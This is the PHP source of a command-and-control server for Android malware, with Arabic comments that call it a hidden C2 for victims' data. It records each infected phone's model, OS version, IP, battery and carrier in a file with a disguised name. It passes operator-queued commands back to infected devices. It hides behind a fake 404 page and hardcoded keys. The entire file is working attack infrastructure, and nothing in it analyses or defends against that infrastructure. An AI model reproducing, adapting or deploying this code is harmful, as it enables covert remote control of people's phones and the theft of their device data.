<?php
// ================= [ PHANTOM API - HIDDEN C2 ] =================
// هذا الملف لا يظهر أي واجهة. هو فقط لاستقبال بيانات الضحايا والأوامر.
// ================================================================
error_reporting(0);
define('SECRET_KEY', 'phantom_worm_v99');
define('DATA_FILE', 'core_sys.dat'); // اسم وهمي لإخفاء الطبيعة الحقيقية للملف

// --- 1. استقبال بيانات الضحية وإرسال الأوامر ---
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['k']) && $_POST['k'] === SECRET_KEY) {
    $id = $_POST['id'];
    $victims = json_decode(file_get_contents(DATA_FILE), true) ?? [];
    
    $victims[$id] = [
        'model'     => $_POST['m'] ?? 'Unknown',
        'android'   => $_POST['a'] ?? 'Unknown',
        'ip'        => $_SERVER['REMOTE_ADDR'],
        'last_seen' => date('Y-m-d H:i:s'),
        'battery'   => $_POST['b'] ?? 'N/A',
        'operator'  => $_POST['o'] ?? 'N/A'
    ];
    
    file_put_contents(DATA_FILE, json_encode($victims, JSON_PRETTY_PRINT));
    
    $cmd_file = "task_{$id}.q"; // امتداد وهمي
    if (file_exists($cmd_file)) {
        echo file_get_contents($cmd_file);
        unlink($cmd_file);
    } else {
        echo "NOP";
    }
    exit;
}

// --- 2. معالجة إرسال الأوامر من لوحة التحكم (GET Request) ---
if (isset($_GET['cmd']) && isset($_GET['vid']) && isset($_GET['auth']) && $_GET['auth'] === 'worm_gpt_2026') {
    $vid = $_GET['vid'];
    $cmd = $_GET['cmd'];
    file_put_contents("task_{$vid}.q", $cmd);
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success', 'message' => 'Command queued']);
    exit;
}

// --- 3. استخراج بيانات الضحايا للوحة التحكم (GET Request) ---
if (isset($_GET['auth']) && $_GET['auth'] === 'worm_gpt_2026' && isset($_GET['action']) && $_GET['action'] === 'list') {
    header('Content-Type: application/json');
    echo file_get_contents(DATA_FILE);
    exit;
}

// إذا لم يتم تلبية أي شرط، نظهر صفحة فارغة (404 مزيفة)
http_response_code(404);
echo "Not Found";
?>
